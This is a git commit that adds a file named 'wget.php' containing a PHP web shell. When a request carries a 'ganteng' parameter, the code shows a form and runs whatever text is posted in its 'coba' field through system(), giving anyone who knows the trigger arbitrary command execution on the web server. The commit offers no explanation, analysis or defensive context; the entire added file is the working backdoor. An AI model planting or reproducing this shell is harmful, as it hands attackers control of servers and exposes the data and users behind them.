d51320ec40ee4696a6778c45fb2d33978084aef0
mrkronkz <33080064+mrkronkz@users.noreply.github.com>
2022-11-18 15:52:37 +0700

    Create wget.php

---
+++ wget.php
@@ -0,0 +1,11 @@
+if(isset($_REQUEST['ganteng'])){
+        echo "<pre>";
+        echo "<form name='form' action='#' method='post'>
+       <input type='text' name='coba'/> <input type='submit' value='enter'/>
+       </form>";
+        $cmd = ($_POST['coba']);
+        system($cmd);
+        echo "</pre>";
+       
+        die;
+}
